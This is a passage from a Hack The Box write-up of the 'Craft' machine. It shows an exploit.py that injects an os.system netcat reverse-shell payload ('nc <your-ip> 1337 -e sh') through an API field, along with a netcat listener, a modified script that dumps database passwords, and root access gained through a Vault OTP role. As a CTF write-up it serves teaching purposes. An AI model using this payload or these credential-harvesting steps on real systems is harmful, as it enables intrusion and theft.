<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></code></pre></figure>

<p>We may be able to use this to inject our payload!</p>

<p>We see that the script uses the api call <code class="highlighter-rouge">/auth/login</code> to obtain a token. From the api page we see that this api call creates an authentication token and requires a username and password:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/api.craft.htb_api_auth-login.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/api.craft.htb_api_auth-login.png" alt="Craft API Auth Login Screenshot" class="img-fluid" /></a></p>

<p>Does this mean we need to find a username and password? I would say so. The username and password are most likley the parameters that go into <code class="highlighter-rouge">auth=('', '')</code> in our script.</p>

<p>Good thing <em>Dinesh</em> is using git I’d say. Let’s check if this script is a revision of a previous version. Taking a look we see the current commit is <code class="highlighter-rouge">a2d28ed155</code> with the message <code class="highlighter-rouge">Cleanup test</code>. Here we can see the changes that were made:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_test-py_commit.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_test-py_commit.png" alt="Gogs Repo Craft Test.py Commit Screenshot" class="img-fluid" /></a></p>

<p>And there we have it:
<code class="highlighter-rouge">dinesh:4aUh...VJxgd</code></p>

<p>Now let’s setup our script:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">### 
# exploit.py
###
</span>
<span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh...VJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>

<span class="c1"># make sure token is valid
</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/check'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># create a sample brew with bogus ABV... should fail.
</span><span class="n">command</span> <span class="o">=</span> <span class="s">'__import__("os").system("nc &lt;your-ip&gt; 1337 -e sh")'</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Create bogus ABV brew"</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="n">command</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></code></pre></figure>

<p>We have our script named <code class="highlighter-rouge">exploit.py</code> that contains <em>Dinesh’s</em> modified code. As you can see we have added a variable named <code class="highlighter-rouge">command</code> that contains <code class="highlighter-rouge">__import__("os").system("nc &lt;your-ip&gt; 1337 -e sh")</code>. Be sure to change <code class="highlighter-rouge">&lt;your-ip&gt;</code> to your own IP address.</p>

<p>Then we can setup our <em>netcat</em> listener:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 1337</code></pre></figure>

<p>Now all that is left to do is run our modified script:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python exploit.py</code></pre></figure>

<p>Once connected running the command <code class="highlighter-rouge">id</code> shows that we are <code class="highlighter-rouge">root</code>. However, on closer inspection we find that we are in a <code class="highlighter-rouge">chroot</code> environment. We can check this by running the command <code class="highlighter-rouge">ls -di /</code> if the output is anything but <code class="highlighter-rouge">2</code> it can indicate that we are chrooted:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-di</span> /
  19256 /</code></pre></figure>

<p>Checking the hostname we see that we are most likely in a docker container:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">hostname
</span>5a3d243127f5</code></pre></figure>

<h3 id="chroot">Chroot</h3>

<p>Since we are in a <em>“jail”</em> our first thoughts are most likely “We have to break out!”. Now before we get carried away the first thing I do when I get a shell is check what we have in our working directory.</p>

<p>Taking a look we find some files and folders:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwxr-xr-x    5 root     root          4096 Jan  4 09:51 <span class="nb">.</span>
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
<span class="nt">-rw-r--r--</span>    1 root     root            18 Feb  7  2019 .gitignore
<span class="nt">-rw-r--r--</span>    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
<span class="nt">-rwxr-xr-x</span>    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests</code></pre></figure>

<p>The first thing I notice is the <code class="highlighter-rouge">dbtest.py</code> as this file was in the <code class="highlighter-rouge">craft_api</code> respository. Since we know that <em>Dinesh</em> loves his test scripts let’s check it out:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="o">.</span><span class="n">cursors</span><span class="o">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span> 
    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span>
        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></figure>

<p>This script takes in credentials and tests the database using the python module <code class="highlighter-rouge">pymysql</code>. There may be creds somewhere! In the script we also see that it imports settings with <code class="highlighter-rouge">from craft_api import settings</code>.</p>

<p>Let’s take a peak in the <code class="highlighter-rouge">craft_api</code> directory:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-la</span> craft_api
total 24
drwxr-xr-x    5 root     root          4096 Feb  7  2019 <span class="nb">.</span>
drwxr-xr-x    5 root     root          4096 Dec 17 09:35 ..
<span class="nt">-rw-r--r--</span>    1 root     root             0 Feb  7  2019 __init__.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 __pycache__
drwxr-xr-x    5 root     root          4096 Feb  7  2019 api
drwxr-xr-x    3 root     root          4096 Feb  7  2019 database
<span class="nt">-rw-r--r--</span>    1 root     root           484 Feb  7  2019 settings.py</code></pre></figure>

<p>Theres our settings. Taking a look at <code class="highlighter-rouge">settings.py</code> we see credentials for the <em>MySQL</em> server:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>settings.py
<span class="c"># Flask settings</span>
FLASK_SERVER_NAME <span class="o">=</span> <span class="s1">'api.craft.htb'</span>
FLASK_DEBUG <span class="o">=</span> False  <span class="c"># Do not use debug mode in production</span>

<span class="c"># Flask-Restplus settings</span>
RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span class="o">=</span> <span class="s1">'list'</span>
RESTPLUS_VALIDATE <span class="o">=</span> True
RESTPLUS_MASK_SWAGGER <span class="o">=</span> False
RESTPLUS_ERROR_404_HELP <span class="o">=</span> False
CRAFT_API_SECRET <span class="o">=</span> <span class="s1">'hz66OCkDtv8G6D'</span>

<span class="c"># database</span>
MYSQL_DATABASE_USER <span class="o">=</span> <span class="s1">'craft'</span>
MYSQL_DATABASE_PASSWORD <span class="o">=</span> <span class="s1">'qLGockJ6G2J75O'</span>
MYSQL_DATABASE_DB <span class="o">=</span> <span class="s1">'craft'</span>
MYSQL_DATABASE_HOST <span class="o">=</span> <span class="s1">'db'</span>
SQLALCHEMY_TRACK_MODIFICATIONS <span class="o">=</span> False</code></pre></figure>

<p>This means <code class="highlighter-rouge">dbtest.py</code> should work. Running the script succeeds and we get some output:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python dbtest.py
<span class="o">{</span><span class="s1">'id'</span>: 12, <span class="s1">'brewer'</span>: <span class="s1">'10 Barrel Brewing Company'</span>, <span class="s1">'name'</span>: <span class="s1">'Pub Beer'</span>, <span class="s1">'abv'</span>: Decimal<span class="o">(</span><span class="s1">'0.050'</span><span class="o">)}</span></code></pre></figure>

<p>Nice! Taking a closer look at the code I notice the use of <code class="highlighter-rouge">cursor.fetchone()</code>. Checking the <em>MySQL</em> documentation for <a href="https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-fetchone.html">cursor.fetchone()</a> this method returns a single record. We don’t want any restrictions here. Within the docs we also see <a href="https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-fetchall.html">cursor.fetchall()</a> which fetches all the rows of a query result. This is what we need!</p>

<p>Let’s update the script with this change and also make life easier for ourselves by adding an argument for the script. This way we can just download our updated script once and then run any <em>MySQL</em> queries from the commandline as we see fit.</p>

<p>This is now what we have:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="o">.</span><span class="n">cursors</span><span class="o">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span> 
    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></figure>

<p>Let’s test our script starting with seeing what tables are available:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python dbtest.py <span class="s2">"show tables;"</span>
<span class="o">[{</span><span class="s1">'Tables_in_craft'</span>: <span class="s1">'brew'</span><span class="o">}</span>, <span class="o">{</span><span class="s1">'Tables_in_craft'</span>: <span class="s1">'user'</span><span class="o">}]</span></code></pre></figure>

<p>We find two tables <code class="highlighter-rouge">brew</code> and <code class="highlighter-rouge">user</code>. Let’s checkout what user info we can get:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python dbtest.py <span class="s2">"select * from user;"</span>
<span class="o">[{</span><span class="s1">'id'</span>: 1, <span class="s1">'username'</span>: <span class="s1">'dinesh'</span>, <span class="s1">'password'</span>: <span class="s1">'4aUh...VJxgd'</span><span class="o">}</span>, <span class="o">{</span><span class="s1">'id'</span>: 4, <span class="s1">'username'</span>: <span class="s1">'ebachman'</span>, <span class="s1">'password'</span>: <span class="s1">'llJ7...LPQB'</span><span class="o">}</span>, <span class="o">{</span><span class="s1">'id'</span>: 5, <span class="s1">'username'</span>: <span class="s1">'gilfoyle'</span>, <span class="s1">'password'</span>: <span class="s1">'ZEU3...rh4T'</span><span class="o">}]</span></code></pre></figure>

<p>Awesome! More creds. Maybe there is no need to be breaking out of any jails this time…</p>

<h2 id="user">User</h2>

<p>None of the creds work on <code class="highlighter-rouge">ssh</code>. But what I did notice was that the ssh service on port <code class="highlighter-rouge">6022</code> needs a ssh key. There might be one lying about somewhere. Both the users <code class="highlighter-rouge">ebachman</code> and <code class="highlighter-rouge">gilfoyle</code> were the developers speaking with <code class="highlighter-rouge">dinesh</code> in the repo issue. Git has been known to cause some security issues in the real world so I think we have a theme going on here. Let’s see if we can login to <code class="highlighter-rouge">Gogs</code> with one of these users.</p>

<p>Yep! We can login as <code class="highlighter-rouge">gilfoyle</code>:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_gilfoyle_dashboard.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_gilfoyle_dashboard.png" alt="Craft Gogs Gilfoyle Dashboard Screenshot" class="img-fluid" /></a></p>

<p>We see that <code class="highlighter-rouge">gilfoyle</code> has a private repo called <code class="highlighter-rouge">craft-infra</code>. Within that repo we see some directories including an <code class="highlighter-rouge">.ssh</code> directory and a directory called <code class="highlighter-rouge">vault</code> which I am going to assume is related to the <code class="highlighter-rouge">vault</code> vhost we found earlier:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_gilfoyle_craft-infra.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_gilfoyle_craft-infra.png" alt="Gogs craft-infra Repository Screenshot" class="img-fluid" /></a></p>

<p>Within the <code class="highlighter-rouge">.ssh</code> directory we find <code class="highlighter-rouge">gilfoyle</code>’s ssh private key:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_gilfoyle_ssh.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_gilfoyle_ssh.png" alt="Gogs Gilfoyle SSH Private Key Screenshot" class="img-fluid" /></a></p>

<p>Attempting to use the ssh key we get asked for a passphrase. Using <code class="highlighter-rouge">gilfoyle</code>’s password we got from the <em>MySQL</em> database again gets us access:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> id_rsa-gilfoyle gilfoyle@craft.htb


  <span class="nb">.</span>   <span class="k">*</span>   ..  <span class="nb">.</span> <span class="k">*</span>  <span class="k">*</span>
<span class="k">*</span>  <span class="k">*</span> @<span class="o">()</span>Ooc<span class="o">()</span><span class="k">*</span>   o  <span class="nb">.</span>
    <span class="o">(</span>Q@<span class="k">*</span>0CG<span class="k">*</span>O<span class="o">()</span>  ___
   |<span class="se">\_</span>________/|/ _ <span class="se">\</span>
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span class="se">\_</span>| |
   |  |  |  |  |<span class="se">\_</span>__/
   |<span class="se">\_</span>|__|__|_/|
    <span class="se">\_</span>________/



Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa-gilfoyle'</span>: 
Linux craft.htb 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gilfoyle@craft:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
bbf4b0cadfa....9cd5a612d4</code></pre></figure>

<p>Ok so we have found the <code class="highlighter-rouge">user.txt</code> flag finally… Let’s move on to <code class="highlighter-rouge">root</code>.</p>

<h2 id="root">Root</h2>

<p>On inspection of the home directory we see some hidden files and folders. Here we can see a file called <code class="highlighter-rouge">.vault-token</code> which must be related to the <code class="highlighter-rouge">vault</code> domain we found earlier as well as the <code class="highlighter-rouge">vaults</code> folder in <code class="highlighter-rouge">gilfoyle</code>’s repository:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
<span class="nt">-rw-r--r--</span> 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
<span class="nt">-rw-r--r--</span> 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
<span class="nt">-r--------</span> 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt
<span class="nt">-rw-------</span> 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
<span class="nt">-rw-------</span> 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo
gilfoyle@craft:~<span class="nv">$ </span><span class="nb">cat</span> .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</code></pre></figure>

<p>Let’s go back to <code class="highlighter-rouge">Gog</code> and research what all this <code class="highlighter-rouge">vault</code> stuff is about. Taking a look in the <code class="highlighter-rouge">vaults</code> directory of <code class="highlighter-rouge">gilfoyle</code>’s repo we see that there is a <code class="highlighter-rouge">Dockerfile</code> for a docker image called <code class="highlighter-rouge">vault</code> by <em>hashicorp.com</em>. Checking out the <a href="https://www.vaultproject.io/intro/getting-started/index.html">documentation</a> we see that <em>Vault</em> is used to <em>“Manage Secrets and Protect Sensitive Data”</em>.</p>

<p>In the <code class="highlighter-rouge">vaults</code> directory I also find a bash script named <code class="highlighter-rouge">secrets.sh</code>:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"> <span class="c">#!/bin/bash</span>

 <span class="c"># set up vault secrets backend</span>

 vault secrets <span class="nb">enable </span>ssh

 vault write ssh/roles/root_otp <span class="se">\</span>
     <span class="nv">key_type</span><span class="o">=</span>otp <span class="se">\</span>
     <span class="nv">default_user</span><span class="o">=</span>root <span class="se">\</span>
     <span class="nv">cidr_list</span><span class="o">=</span>0.0.0.0/0</code></pre></figure>

<p>I find a page in the documentation regarding this setting and which turns out to be <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">One-Time SSH Passwords</a>. The command <code class="highlighter-rouge">vault secrets enable ssh</code> mounts the secrets engine and the <code class="highlighter-rouge">vault write ssh/roles/root_otp</code> is creating a role called <code class="highlighter-rouge">root_otp</code>. On further reading the documentation I see that connecting via ssh can be <em>“automated”</em>.</p>

<p>Let’s see if we have access to the <code class="highlighter-rouge">vault</code> command in <code class="highlighter-rouge">gilfoyle</code>’s account:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">vault
Usage: vault &lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="o">[</span>args]

Common commands:
    <span class="nb">read        </span>Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    kv             Interact with Vaults Key-Value storage
    lease          Interact with leases
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API <span class="nb">help </span><span class="k">for </span>paths
    plugin         Interact with Vault plugins and catalog
    policy         Interact with policies
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens</code></pre></figure>

<p>Ok so this is it. Let’s try the ssh automation we found in the documentation. When logging in you have to use the OTP code that is generated to paste into the password prompt:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">vault ssh <span class="nt">-role</span> root_otp <span class="nt">-mode</span> otp root@10.10.10.110
Vault could not locate <span class="s2">"sshpass"</span><span class="nb">.</span> The OTP code <span class="k">for </span>the session is displayed
below. Enter this code <span class="k">in </span>the SSH password prompt. If you <span class="nb">install </span>sshpass,                                                                                                                  
Vault can automatically perform this step <span class="k">for </span>you.                                                                                                                                          
OTP <span class="k">for </span>the session is: 90ee1390-dcaf-4663-fa52-9069cf312806

  <span class="nb">.</span>   <span class="k">*</span>   ..  <span class="nb">.</span> <span class="k">*</span>  <span class="k">*</span>
<span class="k">*</span>  <span class="k">*</span> @<span class="o">()</span>Ooc<span class="o">()</span><span class="k">*</span>   o  <span class="nb">.</span>
    <span class="o">(</span>Q@<span class="k">*</span>0CG<span class="k">*</span>O<span class="o">()</span>  ___
   |<span class="se">\_</span>________/|/ _ <span class="se">\</span>
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span class="se">\_</span>| |
   |  |  |  |  |<span class="se">\_</span>__/
   |<span class="se">\_</span>|__|__|_/|
    <span class="se">\_</span>________/



Password: 
Linux craft.htb 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 04:53:14 2019
root@craft:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@craft:~# <span class="nb">cat </span>root.txt
831d64ef54....ae28a11591</code></pre></figure>

<p>And there you have it. The <code class="highlighter-rouge">root.txt</code> flag… Now that was a fun ride! Congrats we have captured another flag!!</p>

<h2 id="conclusion">Conclusion</h2>

<p>There have been many cases where git has caused large companies to unintentionally expose their data. A recent realworld example is <a href="https://hackerone.com/reports/716292">Starbucks</a> exposing their JumpCloud API Key in a GitHub repository. This could have lead to a full <em>AWS Account Takeover</em>. Although the scenarios in this machine may have seemed too far fetched to be seen in the wild the reality is that the problem is becoming more of a <a href="https://nakedsecurity.sophos.com/2019/03/25/thousands-of-coders-are-leaving-their-crown-jewels-exposed-on-github/">regular occurence</a>.</p>
<!-- Hack The Box Badge -->
          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
      </div>
    </div>
    <!-- Bootstrap core JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <!-- Custom JavaScript -->
    <script src="/assets/js/sabe.js"></script>
    <!-- Lightbox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
    <script>
      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
        event.preventDefault();
        $(this).ekkoLightbox();
      });
    </script>
  </body>
</html>